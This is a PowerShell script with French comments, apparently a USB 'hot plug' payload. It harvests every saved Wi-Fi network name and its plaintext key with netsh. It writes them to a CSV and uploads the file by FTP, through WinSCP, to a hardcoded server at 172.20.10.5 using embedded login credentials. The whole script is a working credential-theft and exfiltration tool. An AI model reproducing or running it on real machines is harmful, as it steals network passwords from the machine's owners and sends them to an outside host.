$wifi = @()

# Visualisation des réseaux bloqués
$cmd0 = netsh wlan show blockednetworks

# Liste des SSID
$cmd1 = netsh wlan show profiles
ForEach ($row1 in $cmd1) {
    # Récupération des SSID par expression régulière
    If ($row1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)') {
        $ssid = $Matches[1]
        $cmd2 = netsh wlan show profiles $ssid key=clear
        ForEach ($row2 in $cmd2) {
            # Récupération des clés par expression régulière
            If ($row2 -match 'Contenu de la c[^:]+:.(.+)') {
                $key = $Matches[1]
                # Stockage des SSID et des clés dans un tableau
                $wifi += [PSCustomObject]@{ssid = $ssid; key = $key}
            }
        }
    }
}

# Exporter les résultats au format CSV
$csvPath = "$env:USERPROFILE\Documents\Hot Plug\Script\output.csv"
$wifi | Export-CSV -Path $csvPath -NoTypeInformation

# Importer le module WinSCP
Import-Module WinSCP

# Paramètres FTP
$ftpServer = "172.20.10.5"
$ftpUsername = "branavan"
$ftpPassword = "9559"

# Chemin distant sur le serveur FTP
$remoteCsvFilePath = "/home/branavan/Fichier.csv"

# Créer la session WinSCP
$sessionOptions = New-Object WinSCP.SessionOptions -Property @{
    Protocol = [WinSCP.Protocol]::Ftp
    HostName = $ftpServer
    UserName = $ftpUsername
    Password = $ftpPassword
}

$session = New-Object WinSCP.Session

try {
    # Ouvrir la session WinSCP
    $session.Open($sessionOptions)

    # Options de transfert
    $transferOptions = New-Object WinSCP.TransferOptions

    # Transférer le fichier CSV
    $transferResult = $session.PutFiles($csvPath, $remoteCsvFilePath, $False, $transferOptions)

    # Vérifier le résultat du transfert
    if ($transferResult.IsSuccess) {
        Write-Host "Transfert réussi!"
    } else {
        Write-Host "Échec du transfert."
        foreach ($transferError in $transferResult.Failures) {
            Write-Host "Erreur : $($transferError.Message)"
        }
    }
} finally {
    # Fermer la session WinSCP
    $session.Dispose()
}
